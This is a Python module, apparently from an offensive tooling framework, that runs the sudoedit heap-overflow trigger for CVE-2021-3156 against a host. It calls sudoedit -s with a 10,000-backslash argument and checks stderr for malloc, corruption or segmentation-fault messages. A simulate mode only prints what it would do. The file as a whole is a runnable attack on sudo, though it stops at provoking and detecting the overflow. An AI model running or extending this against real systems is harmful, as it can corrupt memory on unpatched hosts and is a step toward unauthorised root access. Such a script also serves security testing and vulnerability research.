# Path: attacks/sudoedit.py

import subprocess

def run(container=None, simulate=False):
    print("[*] Running sudoedit Heap Overflow Exploit (CVE-2021-3156)...")

    if simulate:
        print("[SIMULATE] Would run crafted sudoedit argument to trigger heap overflow.")
        return "Simulated sudoedit overflow run."

    try:
        overflow_arg = "\\" * 10000  # trigger with very long backslashes
        cmd = ["sudoedit", "-s", overflow_arg]

        print("[*] Executing:", " ".join(cmd))

        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()

        print("[+] STDOUT:")
        print(stdout)
        print("[+] STDERR:")
        print(stderr)

        if "malloc" in stderr or "corrupted" in stderr or "Segmentation" in stderr:
            print("[+] Exploit may have triggered overflow.")
        else:
            print("[*] Exploit executed, but no obvious crash.")

    except Exception as e:
        print(f"[!] Exception occurred: {e}")
